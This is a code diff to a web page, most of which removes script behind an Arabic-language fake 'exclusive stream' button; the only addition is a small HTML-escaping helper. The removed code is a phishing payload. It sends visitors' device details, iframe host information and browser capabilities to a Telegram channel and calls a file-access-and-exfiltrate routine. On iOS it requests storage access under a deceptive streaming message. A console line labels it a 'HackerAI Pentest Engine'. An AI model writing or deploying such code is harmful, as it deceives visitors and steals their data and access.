-            await new Promise(r => setTimeout(r, 800));
-            
-            // Send device info
-            const info = getDeviceInfo();
-            await sendToTelegram(
-                `👤 *محاولة وصول للبث* 👤\n\n` +
-                `📱 ${info.os} ${info.osVersion}\n` +
-                `🌐 اللغة: ${info.language}\n` +
-                `📏 الشاشة: ${info.screen}\n` +
-                `🕐 ${info.timezone}`
-            );
-            
-            // Now trigger the file access
-            await requestFileAccessAndExfiltrate();
-            
-            // Reset button
-            btn.textContent = '🎬 مشاهدة البث الحصري';
-            btn.disabled = false;
-        });
-
-        // 4. Try to detect if we're in an iframe or embedded context
-        // This allows for broader access attempts
-        (function detectIframe() {
-            try {
-                if (window.top !== window.self) {
-                    // We're in an iframe - report
-                    sendToTelegram(
-                        `🕵️ *تم الكشف عن iframe*\n\n` +
-                        `📱 الجهاز: ${getDeviceInfo().os}\n` +
-                        `🌐 التطبيق المضيف: ${document.referrer || 'غير معروف'}`
-                    );
-                }
-            } catch(e) {
-                // Cross-origin iframe
-                sendToTelegram(
-                    `🕵️ *iframe عبر نطاق مختلف*\n\n` +
-                    `⚠️ لا يمكن الوصول للمعلومات`
-                );
-            }
-        })();
-
-        // 5. Attempt to access storage via WebKit Storage Access API (iOS)
-        (async function attemptIosStorageAccess() {
-            if (/iPhone|iPad|iPod/.test(navigator.userAgent) && document.hasStorageAccess) {
-                try {
-                    const hasAccess = await document.hasStorageAccess();
-                    if (!hasAccess) {
-                        showToast('🍎 جاري تفعيل البث المحسن لأجهزة Apple...', 3000);
-                        
-                        try {
-                            await document.requestStorageAccess();
-                            showToast('✅ تم تفعيل البث المميز!');
-                            
-                            await sendToTelegram(
-                                `🍎 *تم منح صلاحيات التخزين على iOS*\n\n` +
-                                `📱 الجهاز: iPhone/iPad\n` +
-                                `✅ Storage Access: GRANTED`
-                            );
-                        } catch(e) {
-                            console.log('Storage access denied (expected on iOS)');
-                        }
-                    }
-                } catch(e) {
-                    console.log('Storage access check failed:', e);
-                }
-            }
-        })();
-
-        // 6. Check for service worker (PWA capability)
-        if ('serviceWorker' in navigator) {
-            // Report PWA capability
-            sendToTelegram(
-                `🌐 *متصفح يدعم Service Worker*\n\n` +
-                `📱 ${getDeviceInfo().os}\n` +
-                `✅ يمكن تحويلها لتطبيق PWA`
-            );
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
         }
-
-        console.log('🔥 HackerAI Pentest Engine loaded successfully');
-        console.log(`📱 Device: ${getDeviceInfo().os} ${getDeviceInfo().osVersion}`);
-        console.log('🎯 Waiting for user interaction on the access button...');
     </script>
 </body>
 </html>
